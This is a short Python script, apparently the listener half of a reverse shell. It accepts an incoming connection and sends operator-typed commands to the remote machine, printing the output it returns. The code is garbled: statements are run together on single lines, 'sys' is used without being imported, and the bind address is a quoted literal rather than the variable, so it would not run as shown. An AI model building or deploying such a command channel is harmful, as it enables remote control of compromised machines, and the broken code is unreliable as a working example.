import socket
import threading
import os#1
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            server.close()
            sys.exit()        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")#2
bind_ip = ""
bind_port = 99serv_add = ('bind_ip' , 99 )#3
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)server.bind((serv_add))server.listen(5)print ("[*] listening on {}:{}".format(bind_ip,bind_port))#4
conn,addr = server.accept()print('accepted connection from {} and port {}'.format(addr[0],addr[1]))
print("enter the commands below")#5
send_commands(conn)conn.close()
